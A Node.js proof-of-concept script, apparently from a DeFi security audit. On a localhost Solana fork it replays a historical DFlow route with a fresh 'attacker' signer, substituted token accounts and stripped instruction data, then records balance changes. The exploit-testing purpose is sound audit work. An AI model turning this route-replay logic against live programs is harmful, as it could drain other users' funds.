#!/usr/bin/env node
// Exact outer DFlow route shape with one fresh outsider signer; localhost simulation only.
const fs=require('fs'),crypto=require('crypto');
const M='/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules';
const {PublicKey,Keypair,TransactionInstruction,TransactionMessage,SystemProgram}=require(M+'/@solana/web3.js');
const {getAssociatedTokenAddressSync}=require(M+'/@solana/spl-token');
const b=require(M+'/bs58');const bs58=b.default||b;
const {encodeV1}=require('./klend-v1-composition.js');
const P=x=>new PublicKey(x);
const FORK='http://127.0.0.1:9397';
const DFLOW='DF1ow4tspfHX9JwWJsAb9epbkA8hmpSEAtxXy1V27QBH';
const CASH='CASHx9KJUStyftLFWGvEVf59SGeG9sh5FfcnZMVPCASH';
const TOKEN2022='TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb';
const TOKEN='TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA';
const HIST='36rxrVf9xEASLrygRzWCaBRwVmR62jnaWxoUhF2YqnrstboFcctKhYJp64rHukHtJ6Gn7NAgE4gScwFJ2ukTKWrC';
const HIST_SIGNER='8WLCHaH4DkT1zh6yyzKToiZ3AmUBCBAatjh5radJP8cc';
const HIST_CASH='EMymtZbTAotP5prF2udYL9dam35zYAb61zWy87SVHRcG';
const HIST_USDC='HrR1wUqABm5yhxoFcSMY2gejtKyYpgqhGMBGEftpWsWx';
const HIST_USDT='9FxfthYASdXV1T6NWNLUnzsh4xfonJTNzXPphJ5CUf3G';
const HIST_WSOL='e62GK2F1DPans3NmTCaP68nAhy76WRQypEgw7GMs2Fn';
const env=Object.fromEntries(fs.readFileSync('/tmp/composer-helius-only.env','utf8')
 .split('\n').filter(x=>x.includes('=')).map(x=>x.split(/=(.*)/s).slice(0,2)));
const UPSTREAM=env.HEAVY_RPC_URL||env.RPC_URL;let id=0;
async function rpc(url,m,p){const j=await(await fetch(url,{method:'POST',headers:{'content-type':'application/json'},
 body:JSON.stringify({jsonrpc:'2.0',id:++id,method:m,params:p})})).json();
 if(j.error)throw Error(m+': '+JSON.stringify(j.error));return j.result}
function signed(ix,signer,blockhash){
 const e=encodeV1([ix],signer.publicKey,blockhash);
 const m=new TransactionMessage({payerKey:signer.publicKey,recentBlockhash:blockhash,
  instructions:[ix]}).compileToV0Message();
 if(e.requiredSignatures!==1||!m.staticAccountKeys[0].equals(signer.publicKey))
  throw Error('uncontrolled signer');
 const wire=Buffer.from(e.wire),key=crypto.createPrivateKey({key:Buffer.concat([
  Buffer.from('302e020100300506032b657004220420','hex'),
  Buffer.from(signer.secretKey.subarray(0,32))]),format:'der',type:'pkcs8'});
 crypto.sign(null,wire.subarray(0,wire.length-64),key).copy(wire,wire.length-64);
 return {wire,e};
}
function image(a){if(!a)return null;const data=Buffer.from(a.data[0],'base64');
 return {owner:a.owner,lamports:a.lamports,raw:(a.owner===TOKEN||a.owner===TOKEN2022)&&data.length>=72?
  data.readBigUInt64LE(64).toString():null,
  hash:crypto.createHash('sha256').update(data).digest('hex')};}
async function main(){
 const tx=await rpc(UPSTREAM,'getTransaction',[HIST,{encoding:'json',commitment:'confirmed',
  maxSupportedTransactionVersion:1}]);if(!tx||tx.meta.err)throw Error('source tx unavailable');
 const msg=tx.transaction.message,loaded=tx.meta.loadedAddresses||{writable:[],readonly:[]};
 const all=[...msg.accountKeys,...loaded.writable,...loaded.readonly],head=msg.header;
 const root=msg.instructions.find(x=>all[x.programIdIndex]===DFLOW);
 if(!root||root.accounts.length!==77)throw Error('DFlow route shape changed');
 const attacker=Keypair.generate();
 const attackerCash=getAssociatedTokenAddressSync(P(CASH),attacker.publicKey,false,P(TOKEN2022));
 const attackerUsdc=getAssociatedTokenAddressSync(P('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v'),attacker.publicKey);
 const attackerUsdt=getAssociatedTokenAddressSync(P('Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB'),attacker.publicKey);
 const attackerWsol=getAssociatedTokenAddressSync(P('So11111111111111111111111111111111111111112'),attacker.publicKey);
 const template=(await rpc(FORK,'getAccountInfo',[HIST_CASH,{encoding:'base64'}])).value;
 if(!template||template.owner!==TOKEN2022)throw Error('historical CASH account unavailable');
 await rpc(FORK,'surfnet_setAccount',[attacker.publicKey.toBase58(),{data:'',executable:false,
  lamports:10000000000,owner:SystemProgram.programId.toBase58(),rentEpoch:0}]);
 const cash=Buffer.from(template.data[0],'base64');attacker.publicKey.toBuffer().copy(cash,32);
 cash.writeBigUInt64LE(100000000n,64);
 await rpc(FORK,'surfnet_setAccount',[attackerCash.toBase58(),{data:cash.toString('hex'),
  executable:false,lamports:template.lamports,owner:TOKEN2022,rentEpoch:0}]);
 const writable=i=>i<msg.accountKeys.length?(i<head.numRequiredSignatures?
  i<head.numRequiredSignatures-head.numReadonlySignedAccounts:
  i<msg.accountKeys.length-head.numReadonlyUnsignedAccounts):
  i<msg.accountKeys.length+loaded.writable.length;
 const replacements=new Map([[HIST_SIGNER,attacker.publicKey],[HIST_CASH,attackerCash],
  [HIST_USDC,attackerUsdc],[HIST_USDT,attackerUsdt],[HIST_WSOL,attackerWsol]]);
 const metas=root.accounts.map(i=>({pubkey:replacements.get(all[i])||P(all[i]),
  isSigner:i<head.numRequiredSignatures,isWritable:writable(i)}));
 const originalData=Buffer.from(bs58.decode(root.data));
 if(originalData.readUInt32LE(8)!==5||originalData[12]!==0x25)
  throw Error('route action shape changed');
 const strippedData=Buffer.concat([originalData.subarray(0,8),Buffer.alloc(4),originalData.subarray(89)]);
 strippedData.writeUInt32LE(4,8);
 const ix=new TransactionInstruction({programId:P(DFLOW),keys:metas,data:strippedData});
 const watched=[attacker.publicKey.toBase58(),attackerCash.toBase58(),
  '2A5Cmp2mYwPzdxsQ5w6YTukYR2dNjCWVhnDTWUrifRxd',
  'F2KCaXcp7AoQtxTDvNEDCyMyWjSCAMWNzcyN9dsPfPs5',
  attackerUsdc.toBase58(),attackerUsdt.toBase58(),attackerWsol.toBase58()];
 await rpc(FORK,'getMultipleAccounts',[[...new Set(metas.map(x=>x.pubkey.toBase58()))],{encoding:'base64'}]);
 const pre=(await rpc(FORK,'getMultipleAccounts',[watched,{encoding:'base64'}])).value.map(image);
 const bh=(await rpc(FORK,'getLatestBlockhash',[{commitment:'processed'}])).value.blockhash;
 const {wire,e}=signed(ix,attacker,bh);
 const r=await rpc(FORK,'simulateTransaction',[wire.toString('base64'),{encoding:'base64',
  sigVerify:true,replaceRecentBlockhash:false,commitment:'processed',innerInstructions:true,
  accounts:{encoding:'base64',addresses:watched}}]);
 const post=(r.value.accounts||[]).map(image);
 const o={generatedAt:new Date().toISOString(),scope:'fresh-signer full historical DFlow route through AlphaQ, current local fork',
  sourceSignature:HIST,sourceSlot:tx.slot,forkSlot:r.context.slot,attacker:attacker.publicKey.toBase58(),
  attackerCash:attackerCash.toBase58(),syntheticStartingCashRaw:'100000000',
  wireBytes:e.sizeBytes,addressCount:e.addressCount,instructionCount:e.instructionCount,
  sigVerify:true,noMainnetSubmission:true,watched,pre,post,err:r.value.err,
  computeUnits:r.value.unitsConsumed,logs:r.value.logs?.slice(-80)};
 fs.writeFileSync(__dirname+'/alphaq-dflow-signed-route-no-recordid.json',JSON.stringify(o,null,2)+'\n');
 console.log(JSON.stringify({err:o.err,wireBytes:o.wireBytes,addressCount:o.addressCount,
  computeUnits:o.computeUnits,pre:o.pre.map(x=>x?.raw||x?.lamports||null),
  post:o.post.map(x=>x?.raw||x?.lamports||null),logs:o.logs?.slice(-18)},null,2));
}
main().catch(e=>{console.error(e.stack||e);process.exitCode=1});
